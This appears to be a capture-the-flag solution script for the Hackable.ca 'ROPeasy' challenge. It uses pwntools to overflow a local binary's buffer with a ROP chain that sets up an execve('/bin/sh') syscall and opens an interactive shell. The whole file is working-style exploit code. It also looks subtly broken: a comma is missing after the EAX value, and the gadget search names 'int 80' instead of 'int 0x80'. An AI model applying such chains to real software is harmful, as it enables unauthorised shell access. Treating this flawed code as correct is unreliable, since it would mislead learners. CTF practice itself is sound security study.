#!/usr/bin/python3

# Hackable.ca - ROPeasy
# https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit

from pwn import *
#context.log_level = 'debug'

executable = './ropeasy'
io = process(executable)
context.binary = binary = ELF(executable)

# ROP
rop = ROP(binary)
# pprint(rop.gadgets)           # Non-trivial gadgets are filtered (recommended ROPgadgets)
# exit()

payload = flat([
    b"A" * 16,
    rop.eax.address,                          # 0x080b94a6
    "\x0b\x00\x00\x00"                          # EAX: 0x0b (syscall: execve)
    rop.edx.address,                          # 0x0806feaa
    "\x00\x00\x00\x00",                         # EDX: 0
    rop.ecx.address,                          # 0x0806fed1
    "\x00\x00\x00\x00",                         # ECX: 0
    p32(0x80bc660+0x3),                         # EBX: /bin/sh
                                                  # binary.get_section_by_name('.rodata').header.sh_addr,
    rop.find_gadget(['int 80', 'ret']),       # 0x08070470 : int 80; ret;
                                                # call interrupt 0x80
])

io.recvuntil(b"input: ")
io.sendline(payload)

io.interactive()
exit()
